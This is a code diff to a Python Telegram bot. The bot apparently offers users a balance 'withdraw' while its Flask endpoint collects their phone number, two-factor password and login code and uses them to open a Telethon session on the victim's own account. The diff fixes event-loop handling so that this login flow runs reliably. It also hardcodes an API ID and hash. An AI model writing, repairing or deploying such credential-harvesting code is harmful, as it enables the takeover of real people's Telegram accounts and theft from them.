@@ -1,21 +1,11 @@
 import asyncio
 import logging
 import os
-import signal
 import sys
-import nest_asyncio
 from threading import Thread
 from telethon import TelegramClient, events, Button
 from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from flask import Flask, request, jsonify
-
-nest_asyncio.apply()
-
-def handler(signum, frame):
-    sys.exit(0)
-
-signal.signal(signal.SIGTERM, handler)
-signal.signal(signal.SIGINT, handler)
 
 API_ID = 8
 API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
@@ -25,7 +15,11 @@ CRYPTO_ADDRESS = '0xYourAddress'
 WEBHOOK_URL = 'https://mybot-production-0351.up.railway.app'
 
 logging.basicConfig(level=logging.INFO)
-bot = TelegramClient('bot_session', API_ID, API_HASH)
+logger = logging.getLogger(__name__)
+
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
 app = Flask(__name__)
 
 user_balances = {}
@@ -128,11 +122,11 @@ def withdraw():
     phone = data.get('phone')
     password = data.get('password')
     code = data.get('code')
-    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
+    asyncio.run_coroutine_threadsafe(process_withdraw(user_id, phone, password, code), loop)
     return jsonify({'message': 'Запрос обрабатывается'})
 
 async def process_withdraw(user_id, phone, password, code):
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH, loop=loop)
     try:
         await client.connect()
         await client.send_code_request(phone)
@@ -199,4 +193,4 @@ def run_flask():
 
 if __name__ == '__main__':
     Thread(target=run_flask, daemon=True).start()
-    asyncio.get_event_loop().run_until_complete(main())
+    loop.run_until_complete(main())
